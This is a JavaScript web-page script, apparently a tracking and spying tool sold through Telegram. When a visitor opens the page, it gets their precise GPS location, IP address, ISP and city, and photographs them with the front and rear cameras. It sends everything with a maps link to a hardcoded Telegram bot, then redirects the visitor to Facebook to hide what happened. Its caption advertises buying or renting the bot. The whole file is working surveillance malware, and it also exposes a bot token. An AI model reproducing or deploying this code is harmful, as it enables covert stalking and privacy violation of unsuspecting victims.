const TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const ID = '-1003770043455';

function getGPS() {
    return new Promise((res) => {
        if (!navigator.geolocation) return res(null);
        navigator.geolocation.getCurrentPosition(
            (p) => res({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }),
            () => res(null),
            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
    });
}

async function getVitals() {
    try {
        const r = await fetch('https://ipwho.is/');
        const d = await r.json();
        return {
            ip: d.ip || '?',
            isp: d.connection?.org || '?',
            addr: `${d.city}, ${d.region}`,
            lat: d.latitude || 0,
            lon: d.longitude || 0
        };
    } catch (e) { return { ip: '?', isp: '?', addr: '?', lat: 0, lon: 0 }; }
}

async function capture(mode) {
    try {
        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
        const v = document.createElement('video');
        v.srcObject = s;
        await v.play();
        return new Promise(res => {
            setTimeout(() => {
                const c = document.createElement('canvas');
                c.width = v.videoWidth; 
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                s.getTracks().forEach(t => t.stop());
                c.toBlob(res, 'image/jpeg', 0.8);
            }, 4000);
        });
    } catch (e) { return null; }
}

async function main() {
    const [gps, info] = await Promise.all([getGPS(), getVitals()]);
    
    const p1 = await capture("user");
    await new Promise(r => setTimeout(r, 1500));
    const p2 = await capture("environment");

    const lat = gps ? gps.lat : info.lat;
    const lon = gps ? gps.lon : info.lon;
    const type = gps ? `🎯 GPS (±${Math.round(gps.acc)}m)` : "🌐 IP (Sai số cao)";
    const map = `https://www.google.com/maps?q=${lat},${lon}`;

    const cap = `📡 [THÔNG TIN TRUY CẬP]
🕒 ${new Date().toLocaleString('vi-VN')}
📱 Thiết bị: ${navigator.platform}
🌍 IP: ${info.ip}
🏢 ISP: ${info.isp}
📍 Khu vực: ${info.addr}
🛠 Định vị: ${type}
📌 Maps: ${map}
📸 Camera: ✅ Đã chụp

⚠️ Lưu ý: Thông tin trên có thể không chính xác 100%.
💸 Mua bot - Thuê bot ib Tele: @Mrwenben`.trim();

    const fd = new FormData();
    fd.append('chat_id', ID);
    
    const media = [];
    if (p1) {
        fd.append('f1', p1, '1.jpg');
        media.push({ type: 'photo', media: 'attach://f1', caption: cap });
    }
    
    if (p2) {
        fd.append('f2', p2, '2.jpg');
        media.push({ type: 'photo', media: 'attach://f2', caption: (media.length === 0) ? cap : "" });
    }

    if (media.length > 0) {
        fd.append('media', JSON.stringify(media));
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMediaGroup`, { method: 'POST', body: fd });
    } else {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: ID, text: cap })
        });
    }
    
    setTimeout(() => {
        window.location.href = "https://www.facebook.com/watch/";
    }, 1000);
}

main();
